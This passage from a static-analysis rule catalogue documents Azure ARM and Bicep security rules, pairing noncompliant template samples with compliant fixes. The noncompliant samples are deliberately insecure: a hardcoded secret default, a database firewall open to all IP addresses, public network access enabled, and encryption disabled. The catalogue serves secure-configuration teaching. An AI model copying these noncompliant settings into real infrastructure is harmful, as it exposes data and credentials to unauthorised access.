drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are\ndeprecated as insecure.</p>\n<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS\nversions, and improves performance.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "azureresourcemanager:S6656": {
        "name": "Template evaluation should not expose secure values",
        "htmlDesc": "<p>When using nested deployments in Azure, template expressions can be evaluated within the scope of the parent template or the scope of the nested\ntemplate. If such a template expression evaluates a secure value of the parent template, it is possible to expose this value in the deployment\nhistory.</p>\n<h2>Why is this an issue?</h2>\n<p>Parameters with the type <code>securestring</code> and <code>secureObject</code> are designed to pass sensitive data to the resources being\ndeployed. Secure parameters cannot be accessed after the deployment is completed: they can neither be logged nor used as an output.</p>\n<p>When used in nested deployments, however, it is possible to embed secure parameters in such a way they can be visible afterward.</p>\n<h3>What is the potential impact?</h3>\n<p>If the nested deployment contains a secure parameter in this way, then the value of this parameter may be readable in the deployment history. This\ncan lead to important credentials being leaked to unauthorized accounts.</p>\n<h2>How to fix it in ARM Templates</h2>\n<p>By setting <code>properties.expressionEvaluationOptions.scope</code> to <code>Inner</code> in the parent template, template evaluations are limited\nto the scope of the nested template. This makes it impossible to expose secure parameters defined in the parent template.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"101\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"parameters\": {\n    \"adminUsername\": {\n      \"type\": \"securestring\",\n      \"defaultValue\": \"[newGuid()]\"\n    }\n  },\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Resources/deployments\",\n      \"apiVersion\": \"2022-09-01\",\n      \"properties\": {\n        \"mode\": \"Incremental\",\n        \"template\": {\n          \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n          \"contentVersion\": \"1.0.0.0\",\n          \"resources\": [\n            {\n              \"name\": \"example\",\n              \"type\": \"Microsoft.Compute/virtualMachines\",\n              \"apiVersion\": \"2022-11-01\",\n              \"properties\": {\n                \"osProfile\": {\n                  \"adminUsername\": \"[parameters('adminUsername')]\"\n                }\n              }\n            }\n          ]\n        }\n      }\n    }\n  ]\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"101\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Resources/deployments\",\n      \"apiVersion\": \"2022-09-01\",\n      \"properties\": {\n        \"expressionEvaluationOptions\": {\n          \"scope\": \"Inner\"\n        },\n        \"mode\": \"Incremental\",\n        \"template\": {\n          \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n          \"contentVersion\": \"1.0.0.0\",\n          \"parameters\": {\n            \"adminUsername\": {\n              \"type\": \"securestring\",\n              \"defaultValue\": \"[newGuid()]\"\n            }\n          },\n          \"resources\": [\n            {\n              \"name\": \"example\",\n              \"type\": \"Microsoft.Compute/virtualMachines\",\n              \"apiVersion\": \"2022-11-01\",\n              \"properties\": {\n                \"osProfile\": {\n                  \"adminUsername\": \"[parameters('adminUsername')]\"\n                }\n              }\n            }\n          ]\n        }\n      }\n    }\n  ]\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Microsoft Learn - <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.resources/deployments?pivots=deployment-language-arm-template\"><code>Microsoft.Resources/deployments</code></a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/532\">CWE-532 - Insertion of Sensitive Information into Log File</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "azureresourcemanager:S6648": {
        "name": "Secure strings and objects should not have default values",
        "htmlDesc": "<p>Azure Resource Manager templates define parameters as a way to reuse templates in different environments. Secure parameters (secure strings and\nsecure objects) should not be assigned a default value.</p>\n<h2>Why is this an issue?</h2>\n<p>Parameters with the type <code>securestring</code> and <code>secureObject</code> are designed to pass sensitive data to the resources being\ndeployed. Unlike other data types, they cannot be accessed after the deployment is completed. They can neither be logged nor used as an output.</p>\n<p>Secure parameters can be assigned a default value which will be used if the parameter is not supplied. This default value is not protected and is\nstored in cleartext in the deployment history.</p>\n<h3>What is the potential impact?</h3>\n<p>If the default value contains a secret, it will be disclosed to all accounts that have read access to the deployment history.</p>\n<h2>How to fix it in ARM templates</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"parameters\": {\n    \"secretValue\": {\n      \"type\": \"securestring\",\n      \"defaultValue\": \"S3CR3T\"\n    }\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"parameters\": {\n    \"secretValue\": {\n      \"type\": \"securestring\"\n    }\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/data-types\">Data types in ARM templates</a> </li>\n  <li> <a href=\"https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/best-practices#security-recommendations-for-parameters\">ARM\n  template best practices - Security recommendations for parameters</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/532\">CWE-532 - Insertion of Sensitive Information into Log File</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "azureresourcemanager:S6329": {
        "name": "Allowing public network access to cloud resources is security-sensitive",
        "htmlDesc": "<p>Enabling public network access to cloud resources can affect an organization’s ability to protect its data or internal operations from data theft\nor disruption.</p>\n<p>Depending on the component, inbound access from the Internet can be enabled via:</p>\n<ul>\n  <li> a boolean value that explicitly allows access to the public network. </li>\n  <li> the assignment of a public IP address. </li>\n  <li> database firewall rules that allow public IP ranges. </li>\n</ul>\n<p>Deciding to allow public access may happen for various reasons such as for quick maintenance, time saving, or by accident.</p>\n<p>This decision increases the likelihood of attacks on the organization, such as:</p>\n<ul>\n  <li> data breaches. </li>\n  <li> intrusions into the infrastructure to permanently steal from it. </li>\n  <li> and various malicious traffic, such as DDoS attacks. </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<p>This cloud resource:</p>\n<ul>\n  <li> should be publicly accessible to any Internet user. </li>\n  <li> requires inbound traffic from the Internet to function properly. </li>\n</ul>\n<p>There is a risk if you answered no to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Avoid publishing cloud services on the Internet unless they are intended to be publicly accessible, such as customer portals or e-commerce\nsites.</p>\n<p>Use private networks (and associated private IP addresses) and VPC peering or other secure communication tunnels to communicate with other cloud\ncomponents.</p>\n<p>The goal is to prevent the component from intercepting traffic coming in via the public IP address. If the cloud resource does not support the\nabsence of a public IP address, assign a public IP address to it, but do not create listeners for the public IP address.</p>\n<h2>Sensitive Code Example</h2>\n<p>Using <code>publicNetworkAccess</code> to control access to resources:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nresource exampleSite 'Microsoft.Web/sites@2020-12-01' = {\n  name: 'example-site'\n  properties: {\n    publicNetworkAccess: 'Enabled'\n  }\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Web/sites\",\n      \"apiVersion\": \"2020-12-01\",\n      \"name\": \"example-site\",\n      \"properties\": {\n        \"siteConfig\": {\n          \"publicNetworkAccess\": \"Enabled\"\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Web/sites\",\n      \"apiVersion\": \"2020-12-01\",\n      \"name\": \"example\",\n      \"resources\": [\n        {\n          \"type\": \"config\",\n          \"apiVersion\": \"2020-12-01\",\n          \"name\": \"example-config\",\n          \"properties\": {\n            \"publicNetworkAccess\": \"Enabled\"\n          }\n        }\n      ]\n    }\n  ]\n}\n</pre>\n<p>Using IP address ranges to control access to resources:</p>\n<pre data-diff-id=\"4\" data-diff-type=\"noncompliant\">\nresource exampleFirewall 'Microsoft.Sql/servers/firewallRules@2014-04-01' = {\n  name: 'example-firewall'\n  properties: {\n    startIpAddress: '0.0.0.0'\n    endIpAddress: '255.255.255.255'\n  }\n}\n</pre>\n<pre data-diff-id=\"5\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Sql/servers/firewallRules\",\n      \"apiVersion\": \"2014-04-01\",\n      \"name\": \"example-firewall\",\n      \"properties\": {\n        \"startIpAddress\": \"0.0.0.0\",\n        \"endIpAddress\": \"255.255.255.255\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"6\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Sql/servers\",\n      \"apiVersion\": \"2014-04-01\",\n      \"name\": \"example-database\",\n      \"resources\": [\n        {\n          \"type\": \"firewallRules\",\n          \"apiVersion\": \"2014-04-01\",\n          \"name\": \"example-firewall\",\n          \"properties\": {\n            \"startIpAddress\": \"0.0.0.0\",\n            \"endIpAddress\": \"255.255.255.255\"\n          }\n        }\n      ]\n    }\n  ]\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Using <code>publicNetworkAccess</code> to control access to resources:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nresource exampleSite 'Microsoft.Web/sites@2020-12-01' = {\n  name: 'example-site'\n  properties: {\n    publicNetworkAccess: 'Disabled'\n  }\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Web/sites\",\n      \"apiVersion\": \"2020-12-01\",\n      \"name\": \"example-site\",\n      \"properties\": {\n        \"siteConfig\": {\n          \"publicNetworkAccess\": \"Disabled\"\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Web/sites\",\n      \"apiVersion\": \"2020-12-01\",\n      \"name\": \"example-site\",\n      \"resources\": [\n        {\n          \"type\": \"config\",\n          \"apiVersion\": \"2020-12-01\",\n          \"name\": \"example-config\",\n          \"properties\": {\n            \"publicNetworkAccess\": \"Disabled\"\n          }\n        }\n      ]\n    }\n  ]\n}\n</pre>\n<p>Using IP address ranges to control access to resources:</p>\n<pre data-diff-id=\"4\" data-diff-type=\"compliant\">\nresource exampleFirewall 'Microsoft.Sql/servers/firewallRules@2014-04-01' = {\n  name: 'example-firewall'\n  properties: {\n    startIpAddress: '192.168.0.0'\n    endIpAddress: '192.168.255.255'\n  }\n}\n</pre>\n<pre data-diff-id=\"5\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Sql/servers/firewallRules\",\n      \"apiVersion\": \"2014-04-01\",\n      \"name\": \"example-firewall\",\n      \"properties\": {\n        \"startIpAddress\": \"192.168.0.0\",\n        \"endIpAddress\": \"192.168.255.255\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"6\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Sql/servers\",\n      \"apiVersion\": \"2014-04-01\",\n      \"name\": \"example-database\",\n      \"resources\": [\n        {\n          \"type\": \"firewallRules\",\n          \"apiVersion\": \"2014-04-01\",\n          \"name\": \"example-firewall\",\n          \"properties\": {\n            \"startIpAddress\": \"192.168.0.0\",\n            \"endIpAddress\": \"192.168.255.255\"\n          }\n        }\n      ]\n    }\n  ]\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html\">AWS Documentation</a> - Amazon EC2 instance IP\n  addressing </li>\n  <li> <a href=\"https://docs.aws.amazon.com/dms/latest/userguide/CHAP_ReplicationInstance.PublicPrivate.html\">AWS Documentation</a> - Public and\n  private replication instances </li>\n  <li> <a href=\"https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html\">AWS Documentation</a> - VPC Peering </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/668\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "azureresourcemanager:S6388": {
        "name": "Using unencrypted cloud storages is security-sensitive",
        "htmlDesc": "<p>Using unencrypted cloud storages can lead to data exposure. In the case that adversaries gain physical access to the storage medium they are able\nto access unencrypted information.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The service contains sensitive information that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt cloud storages that contain sensitive information.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.azurearcdata/sqlserverinstances/databases\">Microsoft.AzureArcData/sqlServerInstances/databases</a>:</p>\n<p>Disabled encryption on SQL service instance database:</p>\n<pre data-diff-id=\"1201\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"databases/example\",\n      \"type\": \"Microsoft.AzureArcData/sqlServerInstances/databases\",\n      \"apiVersion\": \"2023-03-15-preview\",\n      \"properties\": {\n        \"databaseOptions\": {\n          \"isEncrypted\": false\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1211\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.AzureArcData/sqlServerInstances/databases@2023-03-15-preview' = {\n  properties: {\n    databaseOptions: {\n      isEncrypted: false\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/disks\">Microsoft.Compute/disks</a>, encryption is disabled by\ndefault.</p>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/snapshots\">Microsoft.Compute/snapshots</a>:</p>\n<p>Disabled disk encryption with settings collection:</p>\n<pre data-diff-id=\"402\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/snapshots\",\n      \"apiVersion\": \"2022-07-02\",\n      \"properties\": {\n        \"encryptionSettingsCollection\": {\n          \"enabled\": false\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"412\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.Compute/snapshots@2022-07-02' = {\n  properties: {\n    encryptionSettingsCollection: {\n      enabled: false\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/virtualmachines\">Microsoft.Compute/virtualMachines</a>:</p>\n<p>Disabled encryption at host level:</p>\n<pre data-diff-id=\"101\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/virtualMachines\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"securityProfile\": {\n          \"encryptionAtHost\": false\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"111\" data-diff-type=\"noncompliant\">\nresource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {\n  properties: {\n    securityProfile: {\n      encryptionAtHost: false\n    }\n  }\n}\n</pre>\n<p>Disabled encryption for managed disk:</p>\n<pre data-diff-id=\"102\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/virtualMachines\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"storageProfile\": {\n          \"dataDisks\": [\n            {\n              \"id\": \"myDiskId\"\n            }\n          ]\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"112\" data-diff-type=\"noncompliant\">\nresource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {\n  properties: {\n    storageProfile: {\n      dataDisks: [\n        {\n          name: 'myDisk'\n        }\n      ]\n    }\n  }\n}\n</pre>\n<p>Disabled encryption for OS disk:</p>\n<pre data-diff-id=\"104\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/virtualMachines\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"storageProfile\": {\n          \"osDisk\": {\n            \"encryptionSettings\": {\n              \"enabled\": false\n            }\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"114\" data-diff-type=\"noncompliant\">\nresource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {\n  properties: {\n    storageProfile: {\n      osDisk: {\n        name: 'myDisk'\n        encryptionSettings: {\n          enabled: false\n        }\n      }\n    }\n  }\n}\n</pre>\n<p>Disabled encryption for OS managed disk:</p>\n<pre data-diff-id=\"105\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/virtualMachines\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"storageProfile\": {\n          \"osDisk\": {\n            \"managedDisk\": {\n              \"id\": \"myDiskId\"\n            }\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"115\" data-diff-type=\"noncompliant\">\nresource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {\n  properties: {\n    storageProfile: {\n      osDisk: {\n        name: 'myDisk'\n        managedDisk: {\n          id: 'myDiskId'\n        }\n      }\n    }\n  }\n}\n</pre>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/virtualmachinescalesets/virtualmachines\">Microsoft.Compute/virtualMachineScaleSets</a>:</p>\n<p>Disabled encryption at host level:</p>\n<pre data-diff-id=\"201\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/virtualMachineScaleSets\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"virtualMachineProfile\": {\n          \"securityProfile\": {\n            \"encryptionAtHost\": false\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"211\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.Compute/virtualMachineScaleSets@2022-11-01' = {\n  properties: {\n    virtualMachineProfile: {\n      securityProfile: {\n        encryptionAtHost: false\n      }\n    }\n  }\n}\n</pre>\n<p>Disabled encryption for data disk:</p>\n<pre data-diff-id=\"202\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/virtualMachineScaleSets\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"virtualMachineProfile\": {\n          \"storageProfile\": {\n            \"dataDisks\": [\n              {\n                \"name\": \"myDataDisk\"\n              }\n            ]\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"212\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.Compute/virtualMachineScaleSets@2022-11-01' = {\n  properties: {\n    virtualMachineProfile: {\n      storageProfile: {\n        dataDisks: [\n          {\n            name: 'myDataDisk'\n          }\n        ]\n      }\n    }\n  }\n}\n</pre>\n<p>Disabled encryption for OS disk:</p>\n<pre data-diff-id=\"204\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/virtualMachineScaleSets\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"virtualMachineProfile\": {\n          \"storageProfile\": {\n            \"osDisk\": {\n              \"name\": \"myOsDisk\"\n            }\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"214\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.Compute/virtualMachineScaleSets@2022-11-01' = {\n  properties: {\n    virtualMachineProfile: {\n      storageProfile: {\n        osDisk: {\n          name: 'myOsDisk'\n        }\n      }\n    }\n  }\n}\n</pre>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.containerservice/managedclusters\">Microsoft.ContainerService/managedClusters</a>:</p>\n<p>Disabled encryption at host and set the disk encryption set ID:</p>\n<pre data-diff-id=\"1101\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.ContainerService/managedClusters\",\n      \"apiVersion\": \"2023-03-02-preview\",\n      \"properties\": {\n        \"agentPoolProfiles\": [\n          {\n            \"enableEncryptionAtHost\": false\n          }\n        ]\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1111\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.ContainerService/managedClusters@2023-03-02-preview' = {\n  properties: {\n    agentPoolProfiles: [\n      {\n        enableEncryptionAtHost: false\n      }\n    ]\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.datalakestore/accounts\">Microsoft.DataLakeStore/accounts</a>:</p>\n<p>Disabled encryption for Data Lake Store:</p>\n<pre data-diff-id=\"501\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.DataLakeStore/accounts\",\n      \"apiVersion\": \"2016-11-01\",\n      \"properties\": {\n        \"encryptionState\": \"Disabled\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"511\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.DataLakeStore/accounts@2016-11-01' = {\n  properties: {\n    encryptionState: 'Disabled'\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformysql/servers\">Microsoft.DBforMySQL/servers</a>:</p>\n<p>Disabled infrastructure double encryption for MySQL server:</p>\n<pre data-diff-id=\"601\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.DBforMySQL/servers\",\n      \"apiVersion\": \"2017-12-01\",\n      \"properties\": {\n        \"infrastructureEncryption\": \"Disabled\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"611\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.DBforMySQL/servers@2017-12-01' = {\n  properties: {\n    infrastructureEncryption: 'Disabled'\n  }\n}\n</pre>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.dbforpostgresql/2017-12-01/servers\">Microsoft.DBforPostgreSQL/servers</a>:</p>\n<p>Disabled infrastructure double encryption for PostgreSQL server:</p>\n<pre data-diff-id=\"701\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.DBforPostgreSQL/servers\",\n      \"apiVersion\": \"2017-12-01\",\n      \"properties\": {\n        \"infrastructureEncryption\": \"Disabled\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"711\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.DBforPostgreSQL/servers@2017-12-01' = {\n  properties: {\n    infrastructureEncryption: 'Disabled'\n  }\n}\n</pre>\n<p>For <a\nhref=\"https://learn.microsoft.com/fr-fr/azure/templates/microsoft.documentdb/cassandraclusters/datacenters\">Microsoft.DocumentDB/cassandraClusters/dataCenters</a>:</p>\n<p>Disabled encryption for a Cassandra Cluster datacenter’s managed disk and backup:</p>\n<pre data-diff-id=\"901\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"cassandraClusters/example\",\n      \"type\": \"Microsoft.DocumentDB/cassandraClusters/dataCenters\",\n      \"apiVersion\": \"2023-04-15\",\n      \"properties\": {\n        \"diskCapacity\": 4\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"911\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.DocumentDB/cassandraClusters/dataCenters@2023-04-15' = {\n  name: 'string'\n  parent: parent\n  properties: {\n    diskCapacity: 4\n  }\n}\n</pre>\n<p>For <a 